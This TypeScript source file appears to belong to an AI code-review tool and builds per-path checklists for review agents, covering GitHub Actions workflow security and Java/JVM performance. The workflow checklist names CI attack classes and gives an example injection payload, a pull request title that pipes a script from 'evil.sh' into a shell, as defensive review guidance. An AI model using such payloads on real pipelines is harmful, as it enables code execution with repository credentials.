/**
 * @license
 * Copyright 2026 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

// Checklists that attach to a *path*, not to a dimension.
//
// The review's dimensions are domain-blind by design — "find security bugs" is a
// lens, not a syllabus — and that works until a file's failure modes are not
// guessable from reading it. A GitHub Actions workflow is the clearest case in this
// repository: it is a YAML file, so it reads as configuration, and a reviewer who
// treats it as configuration misses every one of its attack classes. Not one of the
// nine dimension agents knows to ask whether a `pull_request_target` job checks out
// the pull request's head, and the answer to that question is the difference between
// a CI file and a remote code execution with the repository's write token.
//
// This repo runs `qwen-autofix.yml`, which posts to pull requests. The skill already
// knows a PR branch's CI config is untrusted — Agent 7 is told to read it from the
// base branch — but nothing ever *reviewed a workflow change* for that attack class.
//
// So: a small table of path → checklist, appended to the brief of every agent whose
// territory actually contains a matching file. It is additive to the project's own
// rules (`.qwen/review-rules.md` and friends), never a replacement: a project that
// says nothing about workflows still gets these, and a project that says something
// gets both.
//
// Deliberately *not* here: style rules. The one open-source checklist this borrows
// its shape from ships opinions about `var`, `==`, and nested ternaries — which
// collide head-on with this skill's Exclusion Criteria against formatter-fixable
// nits, and would spend a reviewer's attention on the things a linter already owns.
// A path rule earns its place by naming a defect the dimensions cannot see.

export interface PathRule {
  /** Named in the brief, so an agent can say which rule it applied. */
  title: string;
  /** Does this rule govern `path`? */
  matches(path: string): boolean;
  /** The checklist, agent-facing. */
  checklist: string;
}

const GITHUB_ACTIONS: PathRule = {
  title: 'GitHub Actions workflows',
  matches: (p) =>
    /^\.github\/(workflows\/.+\.ya?ml|actions\/.+\/action\.ya?ml)$/i.test(p),
  checklist: `A workflow is not configuration. It is code that runs on the project's own runners, with the repository's credentials, and some of its inputs come from strangers. The classes below are invisible to a reader looking for "bugs" in YAML.

**You are reviewing this diff, not auditing this file.** A weakness the workflow already had, on a line this change does not touch, is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a guard this diff **removes**.

**Blockers (Critical) — the code does something wrong:**

- **A privileged trigger that checks out the pull request's head.** \`pull_request_target\`, \`workflow_run\` and \`issue_comment\` run in the context of the *base* repository: the base branch's workflow, the base repository's secrets, and a token that can **write**. A checkout of \`github.event.pull_request.head.sha\` / \`.head.ref\` / \`refs/pull/N/merge\` then puts **the contributor's code** in the working directory, and the first \`run:\`, \`npm ci\` (which executes the PR's lifecycle scripts), or locally-referenced action executes it with all of that. This is the most exploited misconfiguration in GitHub Actions. A workflow that needs the PR's *content* without running it should use \`pull_request\` (no secrets, read token), or check out the base and read only the files it will parse.
- **Untrusted \`\${{ ... }}\` interpolated into a \`run:\` script.** The runner substitutes the expression into the shell script **before the shell parses it**, so the value is not a string — it is syntax. \`github.event.issue.title\`, \`.pull_request.title\`, \`.body\`, \`.comment.body\`, \`.head_ref\`, \`.head.repo.description\`, \`.head.repo.default_branch\`, every \`workflow_dispatch\` \`inputs.*\`, and every commit message and branch name are contributor-controlled. A pull request titled \`a"; curl evil.sh | sh; #\` is a command. The fix is to pass the value through \`env:\` and reference \`"$VAR"\` inside the script, where the shell treats it as data.
- **A secret placed where a step that runs untrusted code can read it.** A secret in \`env:\` at workflow or job level is in the environment of **every** step, including the one that builds the pull request. Scope it to the step that uses it. Same for \`persist-credentials\` on \`actions/checkout\`: at its default it writes the token into \`.git/config\`, where any later step — or a script the PR contributed — can read it.
- **A fork guard this diff removes or fails to add on a newly-privileged path.** For any trigger a fork can fire, the guard is what makes everything above unreachable: \`if: github.event.pull_request.head.repo.full_name == github.repository\`, an author-association check, or a \`github.repository == '<owner>/<repo>'\` gate on a scheduled job. A diff that adds a privileged trigger without one has added the vulnerability, not inherited it.
- **\`$GITHUB_OUTPUT\` / \`$GITHUB_ENV\` written from untrusted data.** \`echo "x=$UNTRUSTED" >> "$GITHUB_OUTPUT"\` with a value containing a newline injects a second, arbitrary variable — \`PATH\` or \`NODE_OPTIONS\` among them. Multi-line values need the heredoc form with an unguessable delimiter.
- **Artifact or cache poisoning across a trigger boundary.** A \`workflow_run\` job that downloads an artifact a \`pull_request\` job uploaded is pulling contributor-controlled bytes into a privileged context. So is a cache key a fork can populate.
- **A cache or reuse mechanism whose two sides never agree on identity.** \`actions/cache\` matches an entry on \`(key | restore-key)\` **and** a \`version\` that hashes the literal \`path\` strings plus the compression method — not the key alone. So two jobs can share a key, share the \`path:\` line *as written*, and never hit once: \`\${{ runner.temp }}\` expands to a different string on \`ubuntu-latest\` than in a container job or on a self-hosted runner, and an image without the \`zstd\` binary picks gzip where a hosted runner picks zstd. Compare the **environments** — \`runs-on\`, \`container\`, what each path expression expands to, what each image ships — never the YAML strings, which match in exactly the case that fails. The same question governs any restore/skip/reuse mechanism a diff introduces: does the side that writes agree with the side that reads? A mechanism that can never fire is not a slow optimisation, it is a no-op carrying maintenance cost, and no assertion about the YAML's *shape* will ever say so — tests that the two sides' \`key:\` and \`path:\` strings match pass just as happily when neither side can reach the other's cache. If a hit leaves no observable signal either — a restore step with no \`id:\`, nothing written to \`$GITHUB_STEP_SUMMARY\` — the failure is silent and permanent; say that as part of the finding.

**Recommendations (Suggestion) — say the cost, do not block on them:**

- **A third-party action on a mutable tag.** \`uses: someone/thing@v3\` follows a tag its owner can repoint, and it then runs with your token. Pinning to the 40-character SHA removes that. Judge the *change*: an action that **was** pinned and is now on a tag is a regression and belongs above; a new step that follows the project's existing convention does not. Actions published by GitHub itself (\`actions/*\`) and by this repository's own organisation are the common exception, and most projects take it — do not report those unless the project's own rules say otherwise.
- **\`permissions:\` absent or wider than the job needs.** With no block, the job inherits the repository default, which may be write-all. Naming the minimum at job level is the improvement. **Only report this for a job this diff adds or whose permissions it changes** — plenty of healthy projects have never set it, and sweeping their existing jobs into a PR review is exactly the noise that teaches an author to stop reading. **One exception, and it is not a Suggestion:** a broad token on a job that also runs untrusted code is not a separate recommendation, it is *the blast radius of the blocker above*. Say so there, as part of that finding, at Critical.

**The scripts the workflow calls are part of the workflow.** \`node .github/scripts/x.mjs --title "\${{ github.event.pull_request.title }}"\` moves the injection one file along; it does not remove it. If the diff changes such a script, review its argument handling and its own writes to \`$GITHUB_OUTPUT\` with the same eyes.

**Favour precision over recall here.** A false alarm on a workflow costs more reviewer trust than a missed minor nit, because a YAML finding is the easiest kind for an author to dismiss. Every finding needs the concrete trigger and the concrete outcome, like any other.`,
};

const JAVA: PathRule = {
  title: 'Java / JVM performance',
  matches: (p) => /\.java$/i.test(p),
  checklist: `A Java change's most expensive regressions are decided by the JVM, not by anything a reader can see in the source: HotSpot chooses what to inline, what to scalar-replace, and what to compile at all — and a one-line change can flip each of those on a hot path. The general performance lens (N+1, repeated work, data structures) sees none of it.

**You are reviewing this diff, not auditing this file.** A JVM-cost weakness the code already had, on a line this change does not touch, is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a cheap path this diff **makes hot** (a new caller in a request loop, a call moved inside a loop). Test sources (\`src/test/**\`), \`package-info\`/\`module-info\`, and generated sources are out of scope for the hot-path items — nothing there is hot.

**Correctness traps dressed as concurrency or performance code (Critical):**

- **A \`SimpleDateFormat\` shared across threads.** It is not thread-safe: concurrent \`parse\`/\`format\` corrupts its calendar state and returns silently wrong values or throws. If the diff adds a shared (static or instance field) \`SimpleDateFormat\`, or makes an existing one reachable from more than one thread, that is wrong, not slow. The fix is \`java.time.format.DateTimeFormatter\` (immutable) or a \`ThreadLocal\`.
- **A compound action on \`ConcurrentHashMap\` built from two calls.** \`get\`-then-\`put\`, \`containsKey\`-then-\`put\`, check-then-act of any shape: the map's thread safety covers each call, not the pair, and the race loses an update or runs the guarded work twice. Say what the race corrupts — that is the finding. Fix with \`putIfAbsent\`, \`computeIfAbsent\`, or \`merge\`.
- **Double-checked locking without \`volatile\` on the field.** The reading thread can observe a partially constructed object. If the diff adds or touches the idiom, the field must be \`volatile\` (or replaced with the holder idiom).

**JVM-cost defects provable from the source (Suggestion — a cost, not a wrongness):**

- **A regex compiled per call.** \`Pattern.compile(...)\` in a method body or loop, and the \`String\` conveniences that hide it — \`matches\`, \`replaceAll\`, \`replaceFirst\`, and \`split\` with a real regex (a single-character \`split\` takes a fast path only when the character is not a regex metacharacter — \`split(".")\` does not) — recompile the pattern on every invocation. On a per-request or per-record path that is real CPU. Fix: \`private static final Pattern\`.
- **\`+=\` on a \`String\` inside a loop.** Each iteration rebuilds and copies the whole accumulated prefix; the loop is O(n²) in the final length. Fix: one \`StringBuilder\` outside the loop.
- **Boxing on a hot path.** A \`Long\`/\`Integer\` loop accumulator, a \`Map<Long, …>\` over dense \`int\` keys, \`.boxed()\` in a counted stream: every box past the small-integer cache is an allocation plus a pointer chase per iteration. Fix: primitives, or the primitive streams/collections.
- **A capturing lambda or method reference inside a hot loop.** A non-capturing lambda is a singleton; one that closes over a local allocates per iteration. If the diff moves a capturing lambda into a loop, hoist it or restructure it to capture nothing.
- **A log message built whether or not it is logged.** \`log.debug("result: " + value)\` pays the concatenation with the level off, and even \`log.debug("{}", expensive())\` still pays \`expensive()\`. Fix: parameterized messages, and guard expensive arguments with \`isDebugEnabled()\` or a supplier-based logging API.
- **A collection sized after the fact.** A \`HashMap\`/\`ArrayList\` the code then fills with a known N pays repeated rehash/grow-copy chains; presize it (a \`HashMap\` needs \`N/0.75 + 1\` to avoid rehashing at all).
- **Legacy synchronized types in new code.** \`Vector\`, \`Hashtable\`, \`StringBuffer\` put a monitor on every call; the unsynchronized equivalents are the default for a reason.
- **An exception used as control flow.** Validating by catching \`NumberFormatException\`, looping until \`EOFException\`: \`fillInStackTrace\` costs more than the work being guarded. Validate instead.
- **Reflection rediscovered per call.** \`getMethod\`/\`getField\` on every invocation of a hot path; cache the \`Method\`/\`Field\` — or a \`MethodHandle\` — once.

**JIT inlining — the regression no dimension can see, and you cannot prove from source:**

HotSpot inlines by the **bytecode size of the callee**, against these product defaults (a project's own \`-XX:\` flags, or a different JVM, change them — check before citing):

| callee bytecode size | inlinable |
| --- | --- |
| ≤ 6 (\`MaxTrivialSize\`) | always |
| ≤ 35 (\`MaxInlineSize\`) | even when cold |
| ≤ 325 (\`FreqInlineSize\`) | only at a hot call site |
| > 325 | never |
| > 8000 (\`HugeMethodLimit\`, a develop flag gated by the product \`DontCompileHugeMethods\`) | never even JIT-compiled |

Two more ways a diff can flip it: an already-compiled callee whose **native** size passes \`InlineSmallCode\` (2500 on JDK 11+, 1000 on JDK 8) stops being inlined to protect the code cache, and a call site that gains a **third** receiver implementation goes megamorphic — vtable dispatch, and no inlining **unless one receiver still dominates the profile** (\`TypeProfileMajorReceiverPercent\`, 90% by default), in which case C2 inlines that receiver behind a guard with an uncommon trap for the rest. So the diff-shapes that matter: a small method on a hot path the change **grows** (added validation, logging, a branch), a new layer in a hot call chain, a new implementation registered for an interface invoked in a hot loop. A cold method over 325 bytes is **not** a finding — inlining only matters where the call is hot.

**Measure it; do not estimate bytecode from source.** Two tiers, in order of cost:

1. **Static — available whenever the project builds.** Extract the one class and \`javac\` it into a **scratch** output dir (\`javac -d /tmp/<scratch> …\`), then \`javap -c -p\` the class and read the method's size: the offset of its last instruction plus that instruction's width. Compare against 35 and 325. For the **crossing** claim — "this diff pushed it over the threshold" — get the base side **without touching the tree**: \`git show <merge-base>:<path> > /tmp/<scratch>/X.java\`, compile that too, and measure both; a method already over on the base side is pre-existing, not a finding. **Never \`git checkout\`, \`git stash\`, or build in place.** In a PR review the worktree is shared with agents running concurrently, and in a local review it is the user's own checkout — mutating it corrupts work you cannot see. A full \`mvn\`/\`gradle\` build also executes the branch's contributor-controlled build logic, so prefer \`javac\` on the extracted file over a project build, and treat any build you do run as untrusted code.
2. **Dynamic — when the code is runnable.** Run the workload with \`-XX:+UnlockDiagnosticVMOptions -XX:+PrintInlining\` and grep for the method: \`callee is too large\` / \`hot method too big\` is the JVM itself declining to inline. JMH gives the before/after throughput; JITWatch visualizes the same decision logs.

A finding that a method "can no longer be inlined" without one of these two tiers is a guess stated as fact. Report the **mechanism** instead, at \`Confidence: low\`: the threshold at risk, what the diff added to the method, and the measurement still to run. And if the diff *claims* this path got faster while the mechanism above says it cannot have, the finding is the unsubstantiated claim.

**When the finding IS a grown hot method, the fix to suggest is hot/cold splitting — not reverting the change, and not \`@ForceInline\`** (which copies the callee's full body into every caller, bloating their bytecode and their own inline budgets). Move the cold paths — error handling, rare branches, defensive validation, the \`switch\` arms that almost never fire — into a small private helper, leaving the common path under the threshold; the helper, now called from one site, is itself inlinable. Name the bytecode range to extract and the size it leaves behind, the way the measurement names them: "extract bytecodes 212–311 (~100 bytes) into \`applyRounding\`, leaving \`parseAmount\` at ~238 bytes" is a finding an author can act on; "consider splitting the method" is not.

**Favour precision over recall here.** A guessed JVM finding is the easiest kind for an author to dismiss, and one dismissal teaches them to skip the rest of the review. Every finding needs the concrete hot path and the concrete cost, like any other. Performance findings are **Suggestions** — slow is a cost, not incorrect behaviour — **except where the cost is itself the wrongness**: unbounded allocation, quadratic work, or unbounded cache growth on attacker-reachable input is a denial-of-service hole, which the severity ladder grades Critical, not a Suggestion. Name the reachable input that triggers it; "this loop is slow" with no attacker-reachable trigger stays a Suggestion.`,
};

/** Every rule, in the order their checklists are appended. */
export const PATH_RULES: PathRule[] = [GITHUB_ACTIONS, JAVA];

/**
 * The triggering paths named in a rule's heading — capped. A workflow rule
 * matches one or two files; a Java rule matches every source file in a large
 * PR, and listing hundreds of paths in the heading of every agent's brief is
 * ~11 KB of a list the agent already has from its file table. Name the first
 * few and a count; the checklist, not the path list, is what the heading is
 * for.
 */
function describePaths(which: readonly string[]): string {
  const CAP = 10;
  if (which.length <= CAP) {
    return which.join(', ');
  }
  return `${which.slice(0, CAP).join(', ')}, …and ${which.length - CAP} more`;
}

/**
 * The checklists that govern `paths`, as a brief section — or `''` when none do.
 *
 * Scoped to what the agent can actually see. An agent whose territory holds no
 * workflow is not handed the workflow checklist: a rule that fires on every review
 * is a rule that gets skimmed, and this one has to be read.
 */
export function pathRulesFor(paths: readonly string[]): string {
  const hit = PATH_RULES.filter((r) => paths.some((p) => r.matches(p)));
  if (hit.length === 0) return '';
  const parts = ['## Rules for the files in front of you', ''];
  for (const r of hit) {
    const which = paths.filter((p) => r.matches(p));
    parts.push(`### ${r.title} — ${describePaths(which)}`, '', r.checklist, '');
  }
  return parts.join('\n').trimEnd();
}
